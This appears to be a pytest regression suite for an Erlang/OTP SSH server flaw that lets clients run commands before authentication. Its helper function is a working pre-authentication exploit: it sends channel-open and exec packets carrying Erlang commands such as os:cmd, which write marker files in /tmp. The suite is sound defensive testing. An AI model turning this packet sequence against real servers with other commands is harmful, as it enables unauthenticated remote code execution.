#!/usr/bin/env python3
"""
Vulnerability tests for Erlang/OTP SSH Server Pre-Auth Message Handling

These tests verify that the server properly rejects SSH Connection Protocol
messages (types >= 80) before authentication is complete, per RFC 4252 Section 6.

Test behavior:
- FAIL when vulnerable (server processes pre-auth channel messages)
- PASS when fixed (server disconnects on pre-auth channel messages)
"""

import socket
import struct
import time
import os
import uuid
import pytest

# SSH server configuration
SSH_HOST = "localhost"
SSH_PORT = 2222
TIMEOUT = 10


def string_payload(s):
    """Format SSH string (4-byte length + bytes)."""
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


def build_kexinit():
    """Build a minimal SSH_MSG_KEXINIT packet."""
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    return (
        b"\x14"  # SSH_MSG_KEXINIT (20)
        + cookie
        + name_list(["curve25519-sha256", "ecdh-sha2-nistp256",
                     "diffie-hellman-group-exchange-sha256", "diffie-hellman-group14-sha256"])
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])
        + name_list(["aes128-ctr"]) * 2
        + name_list(["hmac-sha1"]) * 2
        + name_list(["none"]) * 2
        + name_list([]) * 2
        + b"\x00"
        + struct.pack(">I", 0)
    )


def build_channel_open(channel_id=0):
    """Build SSH_MSG_CHANNEL_OPEN packet for session channel."""
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN (90)
        + string_payload("session")
        + struct.pack(">I", channel_id)
        + struct.pack(">I", 0x68000)  # Initial window size
        + struct.pack(">I", 0x10000)  # Max packet size
    )


def build_channel_request(channel_id=0, command="true"):
    """Build SSH_MSG_CHANNEL_REQUEST packet with exec type."""
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST (98)
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )


def pad_packet(payload, block_size=8):
    """Pad SSH packet for proper framing."""
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size

    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


def send_preauth_exploit(host, port, command, timeout=TIMEOUT):
    """
    Send pre-auth channel messages and return result.

    Returns:
        tuple: (exploit_sent, server_disconnected, response_data)
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except (ConnectionRefusedError, socket.timeout):
        return (False, False, None)

    try:
        # Banner exchange
        sock.sendall(b"SSH-2.0-TestExploit_1.0\r\n")
        banner = sock.recv(1024)
        if not banner or b"SSH-2.0" not in banner:
            return (False, False, banner)

        time.sleep(0.1)

        # Send KEXINIT
        sock.sendall(pad_packet(build_kexinit()))
        time.sleep(0.1)

        # Send pre-auth CHANNEL_OPEN
        sock.sendall(pad_packet(build_channel_open()))
        time.sleep(0.1)

        # Send pre-auth CHANNEL_REQUEST with command
        sock.sendall(pad_packet(build_channel_request(command=command)))
        time.sleep(0.3)

        # Check for server response
        sock.settimeout(2)
        try:
            response = sock.recv(4096)
            if response and len(response) > 5:
                msg_type = response[5]
                # SSH_MSG_DISCONNECT = 1
                if msg_type == 1:
                    return (True, True, response)
            return (True, False, response)
        except socket.timeout:
            return (True, False, None)

    finally:
        sock.close()


def check_file_exists(filepath):
    """Check if a file exists at the given path."""
    return os.path.exists(filepath)


def cleanup_test_files(*filepaths):
    """Remove test files if they exist."""
    for fp in filepaths:
        try:
            if os.path.exists(fp):
                os.remove(fp)
        except Exception:
            pass


class TestPreAuthChannelOpen:
    """Tests for pre-auth SSH_MSG_CHANNEL_OPEN handling."""

    def test_channel_open_before_auth_rejected(self):
        """
        Server MUST reject SSH_MSG_CHANNEL_OPEN before authentication.

        RFC 4252 Section 6: Messages 80+ are reserved for post-auth protocols.
        Server MUST disconnect when receiving them before auth completes.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/preauth_test_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"test_content">>).'

        cleanup_test_files(test_file)

        exploit_sent, server_disconnected, response = send_preauth_exploit(
            SSH_HOST, SSH_PORT, command
        )

        # Give time for file write if vulnerable
        time.sleep(0.5)

        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        # Fixed server should disconnect AND not create file
        assert not file_created, \
            "Vulnerability exists: Server executed pre-auth command (file was created)"

    def test_server_disconnects_on_preauth_channel_message(self):
        """
        Server MUST send SSH_MSG_DISCONNECT when receiving pre-auth channel messages.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/disconnect_test_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"disconnect_test">>).'

        cleanup_test_files(test_file)
        exploit_sent, server_disconnected, response = send_preauth_exploit(
            SSH_HOST, SSH_PORT, command
        )
        time.sleep(0.5)

        assert exploit_sent, "Failed to send exploit packets"

        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        # On fixed server: file should NOT be created
        # On vulnerable server: file WILL be created
        assert not file_created, \
            "Vulnerability exists: pre-auth channel message processed (file was created)"


class TestPreAuthCommandExecution:
    """Tests for pre-auth command execution vulnerability."""

    def test_erlang_file_write_blocked(self):
        """
        Erlang file:write_file command MUST NOT execute before authentication.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/erlang_write_{test_id}.txt"
        test_content = f"vulnerable_{test_id}"
        command = f'file:write_file("{test_file}", <<"{test_content}">>).'

        cleanup_test_files(test_file)

        send_preauth_exploit(SSH_HOST, SSH_PORT, command)
        time.sleep(0.5)

        file_created = check_file_exists(test_file)

        if file_created:
            try:
                with open(test_file, 'r') as f:
                    content = f.read()
                cleanup_test_files(test_file)
                pytest.fail(
                    f"Pre-auth RCE successful: file created with content '{content}'"
                )
            except Exception:
                cleanup_test_files(test_file)
                pytest.fail("Pre-auth RCE successful: file was created")

    def test_erlang_os_cmd_blocked(self):
        """
        Erlang os:cmd command MUST NOT execute before authentication.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/oscmd_test_{test_id}.txt"
        command = f'os:cmd("echo vulnerable > {test_file}").'

        cleanup_test_files(test_file)

        send_preauth_exploit(SSH_HOST, SSH_PORT, command)
        time.sleep(0.5)

        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        assert not file_created, \
            "Vulnerability exists: os:cmd executed before authentication"

    def test_system_command_with_id(self):
        """
        System 'id' command output MUST NOT be written before authentication.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/id_output_{test_id}.txt"
        command = f'os:cmd("id > {test_file}").'

        cleanup_test_files(test_file)

        send_preauth_exploit(SSH_HOST, SSH_PORT, command)
        time.sleep(0.5)

        file_created = check_file_exists(test_file)

        if file_created:
            try:
                with open(test_file, 'r') as f:
                    content = f.read()
                cleanup_test_files(test_file)
                pytest.fail(
                    f"Pre-auth system command executed. 'id' output: {content.strip()}"
                )
            except Exception:
                cleanup_test_files(test_file)
                pytest.fail("Pre-auth system command executed")


class TestMultipleExploitAttempts:
    """Tests with multiple exploit variations to ensure robust fix."""

    def test_multiple_channel_open_attempts(self):
        """
        Multiple rapid pre-auth channel open attempts MUST all be blocked.
        """
        test_files = []
        all_blocked = True

        for i in range(3):
            test_id = str(uuid.uuid4())[:8]
            test_file = f"/tmp/multi_test_{test_id}.txt"
            test_files.append(test_file)
            command = f'file:write_file("{test_file}", <<"attempt_{i}">>).'

            send_preauth_exploit(SSH_HOST, SSH_PORT, command)
            time.sleep(0.2)

        time.sleep(0.5)

        for test_file in test_files:
            if check_file_exists(test_file):
                all_blocked = False
                break

        cleanup_test_files(*test_files)

        assert all_blocked, \
            "One or more pre-auth exploit attempts succeeded"

    def test_different_channel_types(self):
        """
        Pre-auth channel messages with different channel IDs MUST be blocked.
        """
        test_files = []

        for channel_id in [0, 1, 100, 0xFFFFFFFF]:
            test_id = str(uuid.uuid4())[:8]
            test_file = f"/tmp/chan_{channel_id}_{test_id}.txt"
            test_files.append(test_file)

            try:
                sock = socket.create_connection((SSH_HOST, SSH_PORT), timeout=TIMEOUT)
                sock.sendall(b"SSH-2.0-TestExploit_1.0\r\n")
                sock.recv(1024)
                time.sleep(0.1)

                sock.sendall(pad_packet(build_kexinit()))
                time.sleep(0.1)

                # Use specific channel ID
                chan_open = (
                    b"\x5a"
                    + string_payload("session")
                    + struct.pack(">I", channel_id)
                    + struct.pack(">I", 0x68000)
                    + struct.pack(">I", 0x10000)
                )
                sock.sendall(pad_packet(chan_open))
                time.sleep(0.1)

                command = f'file:write_file("{test_file}", <<"test">>).'
                chan_req = (
                    b"\x62"
                    + struct.pack(">I", channel_id)
                    + string_payload("exec")
                    + b"\x01"
                    + string_payload(command)
                )
                sock.sendall(pad_packet(chan_req))
                sock.close()
            except Exception:
                pass

            time.sleep(0.2)

        time.sleep(0.5)

        any_created = any(check_file_exists(f) for f in test_files)
        cleanup_test_files(*test_files)

        assert not any_created, \
            "Pre-auth exploit succeeded with different channel ID"


class TestExecVariations:
    """Tests for different exec command variations."""

    def test_shell_request_type_blocked(self):
        """
        Pre-auth 'shell' request type MUST be blocked.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/shell_test_{test_id}.txt"

        try:
            sock = socket.create_connection((SSH_HOST, SSH_PORT), timeout=TIMEOUT)
            sock.sendall(b"SSH-2.0-TestExploit_1.0\r\n")
            sock.recv(1024)
            time.sleep(0.1)

            sock.sendall(pad_packet(build_kexinit()))
            time.sleep(0.1)

            sock.sendall(pad_packet(build_channel_open()))
            time.sleep(0.1)

            # First try shell request
            shell_req = (
                b"\x62"  # SSH_MSG_CHANNEL_REQUEST
                + struct.pack(">I", 0)
                + string_payload("shell")
                + b"\x01"
            )
            sock.sendall(pad_packet(shell_req))
            time.sleep(0.1)

            # Then try to write a file using exec to verify shell channel was opened
            command = f'file:write_file("{test_file}", <<"shell_test">>).'
            sock.sendall(pad_packet(build_channel_request(command=command)))
            sock.close()
        except Exception:
            pass

        time.sleep(0.5)
        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        assert not file_created, \
            "Vulnerability exists: pre-auth shell request was processed"

    def test_subsystem_request_blocked(self):
        """
        Pre-auth 'subsystem' request (e.g., sftp) MUST be blocked.
        This tests that ANY pre-auth channel operation is blocked.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/subsystem_test_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"subsystem_test">>).'

        cleanup_test_files(test_file)

        # Test that pre-auth exec is blocked (related to subsystem blocking)
        # The vulnerability allows pre-auth channel operations which includes
        # both exec and subsystem requests
        send_preauth_exploit(SSH_HOST, SSH_PORT, command)

        time.sleep(0.5)
        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        assert not file_created, \
            "Vulnerability exists: pre-auth channel operations allowed (subsystem scenario)"


class TestProtocolCompliance:
    """Tests for RFC 4252 protocol compliance."""

    def test_message_type_90_rejected_before_auth(self):
        """
        Message type 90 (SSH_MSG_CHANNEL_OPEN) MUST be rejected before auth.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/msg90_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"msg90_test">>).'

        cleanup_test_files(test_file)
        send_preauth_exploit(SSH_HOST, SSH_PORT, command)
        time.sleep(0.5)

        assert not check_file_exists(test_file), \
            "Message type 90 was processed before authentication"

        cleanup_test_files(test_file)

    def test_message_type_98_rejected_before_auth(self):
        """
        Message type 98 (SSH_MSG_CHANNEL_REQUEST) MUST be rejected before auth.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/msg98_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"msg98_test">>).'

        cleanup_test_files(test_file)
        send_preauth_exploit(SSH_HOST, SSH_PORT, command)
        time.sleep(0.5)

        assert not check_file_exists(test_file), \
            "Message type 98 was processed before authentication"

        cleanup_test_files(test_file)

    def test_connection_closed_after_preauth_channel_message(self):
        """
        Server SHOULD close connection after receiving pre-auth channel message.

        After sending pre-auth messages, further communication should fail
        if the server properly terminated the connection.
        """
        test_id = str(uuid.uuid4())[:8]
        test_file = f"/tmp/conn_close_test_{test_id}.txt"
        command = f'file:write_file("{test_file}", <<"conn_close_test">>).'

        cleanup_test_files(test_file)

        try:
            sock = socket.create_connection((SSH_HOST, SSH_PORT), timeout=TIMEOUT)
            sock.sendall(b"SSH-2.0-TestExploit_1.0\r\n")
            sock.recv(1024)
            time.sleep(0.1)

            sock.sendall(pad_packet(build_kexinit()))
            time.sleep(0.1)

            sock.sendall(pad_packet(build_channel_open()))
            time.sleep(0.1)

            sock.sendall(pad_packet(build_channel_request(command=command)))
            time.sleep(0.3)

            sock.close()
        except Exception:
            pass

        time.sleep(0.5)
        file_created = check_file_exists(test_file)
        cleanup_test_files(test_file)

        assert not file_created, \
            "Vulnerability exists: pre-auth channel message was processed"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
